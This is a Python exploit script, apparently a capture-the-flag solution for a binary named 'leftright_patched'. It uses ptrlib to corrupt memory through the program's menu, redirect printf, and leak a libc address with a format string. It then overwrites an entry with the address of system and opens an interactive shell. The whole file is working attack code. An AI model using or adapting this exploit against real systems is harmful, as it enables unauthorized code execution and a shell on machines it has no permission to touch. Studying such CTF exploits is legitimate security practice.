#!/usr/bin/env python
import ptrlib as ptr
import sys

exe = ptr.ELF("./leftright_patched")
libc = ptr.ELF("./libc.so.6")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    sys.stdout.flush()
    io = connect()

    io.sendlineafter("Name: ", "/bin/sh\x00")

    for i in range(0x10000 - 0x78):
        if i == 0:
            io.sendline("1")
            continue
        io.sendlineafter("\n", "1")

    io.sendlineafter("\n", "2")
    printf_last_byte = ptr.p64(unwrap(exe.plt("printf")), byteorder="big")[-1]
    io.sendline(ptr.p8(printf_last_byte + 0x6))

    for i in range(0x38):
        io.sendlineafter("\n", "1")

    io.sendlineafter("\n", "2")
    io.sendline("\xb9")
    io.sendlineafter("\n", "1")
    io.sendlineafter("\n", "2")
    io.sendline("\x51")

    for i in range(0x10000 - 0xFFC1):
        io.sendlineafter("\n", "1")

    io.sendlineafter("\n", "0")

    try:
        io.sendlineafter("Name: ", "#%3$lx#", timeout=1)
    except TimeoutError:
        io.close()
        print("no luck")
        return False

    io.sendline("3")
    io.recvuntil("#")
    libc.base = int(io.recvuntil("#").strip(b"#"), 16) - 0x114A37

    for i in range(0x10000 - 0x78):
        if i == 0:
            io.sendline("1")
            continue
        io.sendlineafter("\n", "1")

    for i in ptr.p64(unwrap(libc.symbol("system"))):
        io.sendlineafter("\n", "2")
        io.sendline(ptr.p8(i))
        io.sendlineafter("\n", "1")
        continue

    for i in range(0x10000 - 0xFF90):
        io.sendlineafter("\n", "1")

    io.sendlineafter("\n", "3")

    io.recvuntil("command not found\n")

    print("exploit succeeded")
    io.sh()
    return True


if __name__ == "__main__":
    flag = False
    while not flag:
        flag = main()
